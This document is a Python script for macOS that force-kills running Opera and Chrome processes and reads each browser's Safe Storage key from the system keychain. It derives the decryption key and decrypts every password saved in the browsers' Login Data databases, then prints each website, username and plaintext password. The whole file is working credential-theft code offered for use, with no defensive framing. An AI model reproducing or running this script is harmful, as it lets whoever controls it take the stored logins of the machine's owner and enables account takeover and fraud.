import sqlite3
import os
import binascii
import subprocess
import base64
import sys
import hashlib
import glob
import time

operapid = (
    subprocess.check_output("ps -A | grep Opera | awk '{print $1}'", shell=True)
    .replace(b"\n",b" ")
    .replace(b"\"", b"")
)

operapid = operapid.decode('utf-8').split()

chromepid = (
    subprocess.check_output("ps -A | grep Google\ Chrome | awk '{print $1}'", shell=True)
    .replace(b"\n",b" ")
    .replace(b"\"", b"")
)

chromepid = chromepid.decode('utf-8').split()

subprocess.Popen(
    ['kill', "-9", operapid[0]],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

time.sleep(1)

subprocess.Popen(
    ['kill', "-9", chromepid[0]],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

time.sleep(1)

OperaLoginData = glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/com.operasoftware.OperaGX/Login Data")
ChromeLoginData = glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/Google/Chrome/Profile*/Login Data")
if len(ChromeLoginData) == 0 or len(OperaLoginData) == 0:
    OperaLoginData = glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/com.operasoftware.OperaGX/Login Data")  # attempt default profile
    ChromeLoginData = glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/Google/Chrome/Default/Login Data")

OperaSafeStorageKey = (
    subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Opera' | awk '{print $2}'", shell=True)
    .replace(b"\n", b"")
    .replace(b"\"", b"")
)

ChromeSafeStorageKey = (
    subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True)
    .replace(b"\n", b"")
    .replace(b"\"", b"")
)


if ChromeSafeStorageKey == b"" or OperaSafeStorageKey == b"":
    print("ERROR getting Safe Storage Key")
    sys.exit()

def PasswordDecrypt(encrypted_value, iv, key=None):  # AES decryption using the PBKDF2 key and 16x ' ' IV, via openSSL (installed on OSX natively)
    hexKey = binascii.hexlify(key).decode('utf-8')
    hexEncPassword = base64.b64encode(encrypted_value[3:]).decode('utf-8')
    try:  # send any error messages to /dev/null to prevent screen bloating up
        decrypted = subprocess.check_output(
            f"openssl enc -base64 -d -aes-128-cbc -iv '{iv}' -K {hexKey} <<< {hexEncPassword} 2>/dev/null", shell=True
        )
    except Exception as e:
        decrypted = b"ERROR retrieving password"
    return decrypted

def ChromiumProcess(safeStorageKey, loginData):
    iv = ''.join(('20',) * 16)  # salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
    key = hashlib.pbkdf2_hmac('sha1', safeStorageKey, b'saltysalt', 1003)[:16]
    fd = os.open(loginData, os.O_RDONLY)  # open as read only
    database = sqlite3.connect(f'/dev/fd/{fd}')
    os.close(fd)
    sql = 'select username_value, password_value, origin_url from logins'
    decryptedList = []
    with database:
        for user, encryptedPass, url in database.execute(sql):
            if user == "" or (encryptedPass[:3] != b'v10'):  # user will be empty if they have selected "never" store password
                continue
            else:
                urlUserPassDecrypted = (
                    url,
                    user,
                    PasswordDecrypt(encryptedPass, iv, key=key),
                )
                decryptedList.append(urlUserPassDecrypted)
    return decryptedList

print(f"Printing Opera Passwords")

for profile in OperaLoginData:
    for i, x in enumerate(ChromiumProcess(OperaSafeStorageKey, f"{profile}")):
        print(f"Website: {x[0]}\nUser: {x[1]}\nPass: {x[2].decode('utf-8')}\n")
        time.sleep(1)

print(f"Printing Chrome Passwords")

for profile in ChromeLoginData:
    for i, x in enumerate(ChromiumProcess(ChromeSafeStorageKey, f"{profile}")):
        print(f"Website: {x[0]}\nUser: {x[1]}\nPass: {x[2].decode('utf-8')}\n")
        time.sleep(1)
